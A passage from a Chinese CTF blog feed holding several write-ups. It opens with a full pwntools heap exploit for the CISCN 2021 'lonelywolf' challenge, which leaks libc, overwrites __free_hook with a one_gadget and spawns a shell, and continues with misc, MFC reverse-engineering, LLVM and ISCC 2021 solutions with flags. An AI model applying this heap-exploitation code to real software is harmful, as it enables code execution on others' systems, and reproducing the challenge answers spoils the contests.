class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># local_libc=libc-2.27-1.4</span></span><br><span class="line"><span class="comment"># remote_libc=libc-2.27-1.3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">filename = <span class="string">&quot;lonelywolf&quot;</span></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">content = <span class="number">0</span></span><br><span class="line">offset = <span class="number">0</span></span><br><span class="line"><span class="comment"># elf</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line"><span class="comment"># libc</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,payload</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b</span>(<span class="params">addr</span>):</span></span><br><span class="line">    bk = <span class="string">&quot;b *$rebase&quot;</span> + <span class="built_in">str</span>(addr)</span><br><span class="line">    gdb.attach(io, bk)</span><br><span class="line">    success(<span class="string">&quot;attach&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">global</span> io</span><br><span class="line">    <span class="keyword">if</span> content == <span class="number">0</span>:</span><br><span class="line">        io = process(<span class="string">&quot;./&quot;</span> + filename)</span><br><span class="line">        libc=ELF(<span class="string">&quot;/home/giantbranch/Desktop/ctfpwn/clibcc/pwn-change-libc-main/libs/2.27-3ubuntu1.4_amd64/libc-2.27.so&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;121.36.14.168&quot;</span>,<span class="number">24583</span>)</span><br><span class="line">        libc=ELF(<span class="string">&quot;/home/giantbranch/Desktop/ctfpwn/ctf-cpt/ciscn/lonelywolf/附件/libc-2.27.so&quot;</span>)</span><br><span class="line">    <span class="comment">#ogg_libc=[0x4f3d5,0x4f432,0x10a41c]</span></span><br><span class="line">    ogg_libc=[<span class="number">0x4f3d5</span>,<span class="number">0x4f432</span>,<span class="number">0x10a41c</span>]</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x10</span>)</span><br><span class="line">    edit(<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x10</span>))</span><br><span class="line">    <span class="comment">#####leak_chunk_addr#####</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x8</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x8</span>))</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x8</span>))</span><br><span class="line">    chunk00_addr=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    print(<span class="string">&quot;chunk00_addr:&quot;</span>,<span class="built_in">hex</span>(chunk00_addr))</span><br><span class="line">    chunk0_addr=chunk00_addr+<span class="number">0x250</span></span><br><span class="line">    print(<span class="string">&quot;chunk0_addr:&quot;</span>,<span class="built_in">hex</span>(chunk0_addr))</span><br><span class="line">    <span class="comment">#####prepare_to_change_size#####</span></span><br><span class="line">    edit(<span class="number">0</span>,p64(chunk0_addr+<span class="number">0x20</span>+<span class="number">0x90</span>))</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x70</span>)</span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x60</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x70</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    <span class="comment">#####A1igNed_chunk_size#####</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0</span>, <span class="number">0x60</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x30</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x40</span>)</span><br><span class="line">    <span class="comment">#####unsorted_size#####</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">10</span>)</span><br><span class="line">    edit(<span class="number">0</span>,p64(<span class="number">0</span>)+p16(<span class="number">0x421</span>))<span class="comment">#+p64(chunk0_addr+0x30)</span></span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x70</span>)</span><br><span class="line">    <span class="comment">######malloc_to_unsorted_chunk######</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x70</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">0</span>,p64(chunk00_addr+<span class="number">0x310</span>)+p64(chunk00_addr)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x70</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x70</span>)</span><br><span class="line">    <span class="comment">#####leak_libc#####</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    malloc_hook=u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))<span class="number">-96</span><span class="number">-0x10</span></span><br><span class="line">    print(<span class="string">&quot;malloc_hook:&quot;</span>,<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">    <span class="comment">####count####</span></span><br><span class="line">    libcbase=malloc_hook-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    free_hook=libcbase+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    print(<span class="string">&quot;free_hook:&quot;</span>,<span class="built_in">hex</span>(free_hook))</span><br><span class="line">    ogg_addr=libcbase+ogg_libc[<span class="number">2</span>]</span><br><span class="line">    <span class="comment">#####malloc_to_free_hook#####</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x50</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">0</span>,p64(free_hook)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x50</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x50</span>)</span><br><span class="line">    <span class="comment">#####edit_free_hook#####</span></span><br><span class="line">    edit(<span class="number">0</span>,p64(ogg_addr)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="comment">#####getshell#####</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    <span class="comment">#b(0x00000000000008A0)</span></span><br><span class="line">    io.interactive()</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="隔空传话"><a href="#隔空传话" class="headerlink" title="隔空传话"></a>隔空传话</h2><h3 id="解码"><a href="#解码" class="headerlink" title="解码"></a>解码</h3><p>找个在线网站解密<a href="http://www.sendsms.cn/pdu/">PDU解码</a></p><p>得到第一个</p><p><img src="/2021/05/16/CISCN2021/9.png"></p><p>以及第二个</p><p><img src="/2021/05/16/CISCN2021/10.png"></p><p>并且把剩下的全部数据解密了</p><h3 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">TimeStamp:25&#x2F;04&#x2F;21 19:43:59</span><br><span class="line"></span><br><span class="line">5b4c4ce7b6d5edd6d5cb961fca84f193ca71471db155b62c9df5ea1ebed933929de07bebcdb7853ddaf6303ac6fbaaa0fff6bb23cbfefbecd716028173e1259796fbeebf3f12f43ea54fcfeee54f11c8</span><br><span class="line"></span><br><span class="line">TimeStamp:25&#x2F;04&#x2F;21 19:44:43</span><br><span class="line"></span><br><span class="line">f5a91d7cb54fd0b83e927bbfbe7d6a121d32649748f453ca0fbffe56162c5e5c4e3f757804e9aeb17a8b441513c78591c43c9493bb2567c6a475e69c59912c9e2f0785fe43761a523efa7c7479effdbf</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>(剩下的数据都差不多)</p><p>根据时间排序并将其写成文件,存为png文件</p><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>然而png文件打不开,于是联想到hint2,改png宽度为465</p><p>在联想第一个hint,补全flag即可</p><p><img src="/2021/05/16/CISCN2021/11.png"></p>]]></content>
      
      
      <categories>
          
          <category> 赛题 </category>
          
          <category> CISCN-2021 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 赛题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mfc程序基本流程</title>
      <link href="/2021/05/09/mfc%E7%A8%8B%E5%BA%8F%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B/"/>
      <url>/2021/05/09/mfc%E7%A8%8B%E5%BA%8F%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="如何找按钮对应的函数"><a href="#如何找按钮对应的函数" class="headerlink" title="如何找按钮对应的函数"></a>如何找按钮对应的函数</h1><h2 id="1-用rresource-hacke查找资源"><a href="#1-用rresource-hacke查找资源" class="headerlink" title="1. 用rresource hacke查找资源"></a>1. 用rresource hacke查找资源</h2><p>在resource hacke中得到消息框中不同按钮对应的编号，本图：确定对应1，取消对应2，输入框对应1000。</p><p><img src="/2021/05/09/mfc%E7%A8%8B%E5%BA%8F%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B/1.PNG"></p><h2 id="2-在ida中搜索按钮对应的编号"><a href="#2-在ida中搜索按钮对应的编号" class="headerlink" title="2. 在ida中搜索按钮对应的编号"></a>2. 在ida中搜索按钮对应的编号</h2><p><img src="/2021/05/09/mfc%E7%A8%8B%E5%BA%8F%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B/2.PNG"></p><h2 id="3-创建新的本地型"><a href="#3-创建新的本地型" class="headerlink" title="3. 创建新的本地型"></a>3. 创建新的本地型</h2><p>在Local Types视图中插入下面的内容：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">AFX_MSGMAP_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        UINT nMessage;</span><br><span class="line">        UINT nCode;</span><br><span class="line">        UINT nID;</span><br><span class="line">        UINT nLastID;</span><br><span class="line">        UINT_PTR nSig;</span><br><span class="line">        <span class="keyword">void</span> (*pfn)(<span class="keyword">void</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">AFX_MSGMAP</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">const</span> AFX_MSGMAP *(__stdcall *pfnGetBaseMap)();</span><br><span class="line">  <span class="keyword">const</span> AFX_MSGMAP_ENTRY *lpEntries;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="4-导入新的本地型"><a href="#4-导入新的本地型" class="headerlink" title="4. 导入新的本地型"></a>4. 导入新的本地型</h2><p>选中新导入的本地型，右击，Synchronize to idb.</p><p><img src="/2021/05/09/mfc%E7%A8%8B%E5%BA%8F%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B/3.PNG"></p><h2 id="5-修改数据为新定义结构体格式"><a href="#5-修改数据为新定义结构体格式" class="headerlink" title="5. 修改数据为新定义结构体格式"></a>5. 修改数据为新定义结构体格式</h2><p>选中在第二步找到的数据，由Edit&gt;Structs&gt;Struct var应用新的结构体</p><p><img src="/2021/05/09/mfc%E7%A8%8B%E5%BA%8F%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B/4.PNG"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-知识点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LLVM-Clang编译器安装和使用</title>
      <link href="/2021/05/05/LLVM-Clang%E7%BC%96%E8%AF%91%E5%99%A8%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"/>
      <url>/2021/05/05/LLVM-Clang%E7%BC%96%E8%AF%91%E5%99%A8%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><blockquote><ol><li>apt-get install clang</li></ol></blockquote><blockquote><ol start="2"><li>apt-get install llvm</li></ol></blockquote><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="LLVM-IR文件"><a href="#LLVM-IR文件" class="headerlink" title="LLVM IR文件"></a>LLVM IR文件</h2><ol><li><p>使用clang将C源码转换为LLVM IR(文本形式)：</p><blockquote><p>clang -emit-llvm -S test.c -o test.ll / clang -O3 -emit-llvm test.c -S -o test.ll</p></blockquote></li><li><p>使用clang将C源码转换为LLVM IR(二进制形式)：</p><blockquote><p>clang -emit-llvm test.c -c -o test.bc / clang -O3 -emit-llvm test.c -c -o test.bc</p></blockquote></li><li><p>LLVM IR文件格式转换(.bc和.ll文件的转换)</p><blockquote><p>llvm-as test.ll -o test.bc     //llvm .ll -&gt; .bc assembler<br>llvm-dis test.bc -o test.ll  //llvm .bc -&gt; .ll disassembler</p></blockquote></li><li><p>将LLVM字节码转换为机器汇编码</p><blockquote><p>llc test.bc -o test.s</p></blockquote></li><li><p>由LLVM IR生成对应的可执行文件</p><blockquote><p>llc -filetype=obj test.ll -o test.o<br>gcc test.o<br>或者<br>llc -filetype=obj test.bc -o test.o<br>gcc test.o</p></blockquote></li></ol><p>注：生成可执行文件时，若出现如下或类似的报错</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/ld: test.o: relocation R_X86_64_32 against symbol `what<span class="string">&#x27; can not be used when making a PIE object; recompile with -fPIE</span></span><br><span class="line"><span class="string">collect2: error: ld returned 1 exit status</span></span><br></pre></td></tr></table></figure><p>使用</p><blockquote><p>clang++  test.o -o test</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-知识点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ISCC-2021</title>
      <link href="/2021/05/01/ISCC-2021/"/>
      <url>/2021/05/01/ISCC-2021/</url>
      
        <content type="html"><![CDATA[<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="Garden"><a href="#Garden" class="headerlink" title="Garden"></a>Garden</h2><a id="more"></a><p>逆向签到题，一道python逆向。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python 2.7 (62211)</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment"># Compiled at: 2021-02-27 22:29:29</span></span><br><span class="line"><span class="comment">#Powered by BugScaner</span></span><br><span class="line"><span class="keyword">import</span> platform, sys, marshal, types</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">s</span>):</span></span><br><span class="line">    f = <span class="string">&#x27;2(88\x006\x1a\x10\x10\x1aIKIJ+\x1a\x10\x10\x1a\x06&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(s) != <span class="built_in">len</span>(f):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    checksum = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(f, s):</span><br><span class="line">        checksum += <span class="built_in">ord</span>(b) ^ <span class="built_in">ord</span>(a) ^ <span class="number">123</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> checksum == <span class="number">0</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> sys.version_info.major != <span class="number">2</span> <span class="keyword">or</span> sys.version_info.minor != <span class="number">7</span>:</span><br><span class="line">    sys.exit(<span class="string">&#x27;\xe8\xaf\x95\xe8\xaf\x95 Python 2.7.&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">    sys.exit(<span class="string">&#x27;usage: bronze.pyc &lt;flag&gt;&#x27;</span>)</span><br><span class="line">flag = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(flag) &gt;= <span class="number">32</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;\xe5\xa4\xaa\xe9\x95\xbf\xe4\xba\x86.&#x27;</span></span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line">alphabet = <span class="built_in">set</span>(<span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#123;&#125;!@#$%+&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="keyword">if</span> ch <span class="keyword">not</span> <span class="keyword">in</span> alphabet:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;\xe4\xb8\x8d\xe5\xaf\xb9.&#x27;</span></span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> check(flag):</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;\xe5\xb0\xb1\xe6\x98\xaf\xe8\xbf\x99\xe4\xb8\xaa!&#x27;</span></span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;\xe6\x90\x9e\xe9\x94\x99\xe4\xba\x86.&#x27;</span></span><br><span class="line">    sys.exit(1)&lt;/flag&gt;</span><br></pre></td></tr></table></figure><p>逻辑很简单，就是让checksum=0，即 0=ord(b) ^ ord(a) ^ 123，转换一下，flag[i]=0^f[i]^123</p><blockquote><p>exp</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="string">&#x27;2(88\x006\x1a\x10\x10\x1aIKIJ+\x1a\x10\x10\x1a\x06&#x27;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="number">0</span>^<span class="number">123</span>^<span class="built_in">ord</span>(i))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><blockquote><p>ISCC{Makka2021Pakka}</p></blockquote><h2 id="汇编大人，时代变了"><a href="#汇编大人，时代变了" class="headerlink" title="汇编大人，时代变了"></a>汇编大人，时代变了</h2><p>这一题给了一个task.ll文件，打开百度后知道是LLVM IR。<br>使用LLVM-Clang编译器将task.ll文件转为可执行文件.<br>之后拖入ida中快乐F5.</p><blockquote><p>main函数</p></blockquote><p><img src="/2021/05/01/ISCC-2021/1.PNG"></p><blockquote><p>check</p></blockquote><p><img src="/2021/05/01/ISCC-2021/2.PNG"></p><p>根据最上面的两句话可猜出，check返回值恒为一或恒为零，然后我先试了else那条路，得到了一个假的falg：___7h15_15_4_f4k3_f14g_y0u_w1ll_f41l_1f_y0u_subm17_17___。<br>可以确定flag在if那条路中，根据check函数即可写出解题脚本，这里我使用了爆破.</p><blockquote><p>exp</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> what[]=&#123;<span class="number">0x64</span>, <span class="number">0x4E</span>, <span class="number">0x6C</span>, <span class="number">0x2E</span>, <span class="number">0x1E</span>, <span class="number">0x36</span>, <span class="number">0x38</span>, <span class="number">0x04</span>, <span class="number">0x44</span>, <span class="number">0x12</span>, <span class="number">0x1C</span>, <span class="number">0x24</span>, <span class="number">0x5C</span>, <span class="number">0x59</span>, <span class="number">0x3D</span>, <span class="number">0x0B</span>, <span class="number">0x5A</span>, <span class="number">0x78</span>, <span class="number">0x08</span>, <span class="number">0x09</span>, <span class="number">0x76</span>, <span class="number">0x70</span>, <span class="number">0x79</span>, <span class="number">0x33</span>, <span class="number">0x13</span>, <span class="number">0x16</span>, <span class="number">0x20</span>, <span class="number">0x7E</span>, <span class="number">0x6B</span>, <span class="number">0x23</span>, <span class="number">0x36</span>, <span class="number">0x45</span>, <span class="number">0x07</span>, <span class="number">0x11</span>, <span class="number">0x2C</span>, <span class="number">0x22</span>, <span class="number">0x4A</span>, <span class="number">0x4A</span>, <span class="number">0x4F</span>, <span class="number">0x2E</span>, <span class="number">0x48</span>, <span class="number">0x4C</span>, <span class="number">0x7C</span>, <span class="number">0x3E</span>, <span class="number">0x11</span>, <span class="number">0x0F</span>, <span class="number">0x6A</span>, <span class="number">0x18</span>, <span class="number">0x37</span>, <span class="number">0x42</span>, <span class="number">0x1E</span>, <span class="number">0x2B</span>, <span class="number">0x12</span>, <span class="number">0x03</span>, <span class="number">0x5A</span>, <span class="number">0x47</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> secret[]=&#123;<span class="number">0x42</span>, <span class="number">0x0A</span>, <span class="number">0x7C</span>, <span class="number">0x5F</span>, <span class="number">0x22</span>, <span class="number">0x06</span>, <span class="number">0x1B</span>, <span class="number">0x67</span>, <span class="number">0x37</span>, <span class="number">0x23</span>, <span class="number">0x5C</span>, <span class="number">0x46</span>, <span class="number">0x0A</span>, <span class="number">0x29</span>, <span class="number">0x09</span>, <span class="number">0x30</span>, <span class="number">0x51</span>, <span class="number">0x38</span>, <span class="number">0x5F</span>, <span class="number">0x7B</span>, <span class="number">0x59</span>, <span class="number">0x13</span>, <span class="number">0x18</span>, <span class="number">0x0D</span>, <span class="number">0x50</span>&#125;;</span><br><span class="line">  <span class="keyword">int</span> flag[<span class="number">56</span>];</span><br><span class="line">  <span class="keyword">int</span> i,j;</span><br><span class="line">  <span class="keyword">for</span>(j=<span class="number">32</span>;j&lt;<span class="number">127</span>;j++)</span><br><span class="line">  &#123;</span><br><span class="line">  flag[<span class="number">0</span>]=j;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">56</span>;i++)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">if</span>(i&lt;<span class="number">55</span>)</span><br><span class="line">  flag[i+<span class="number">1</span>]=flag[i]^what[i];</span><br><span class="line">  flag[i] = flag[i] ^ secret[i % <span class="number">25</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,flag[i]);</span><br><span class="line">&#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/05/01/ISCC-2021/3.PNG"></p><blockquote><p>ISCC{mAy6e_t0d4Y_7H15_ls_tH3_10n8est_f14g_Y0_HaD_Ev3R_5e3n_!_}</p></blockquote><h2 id="Analysis"><a href="#Analysis" class="headerlink" 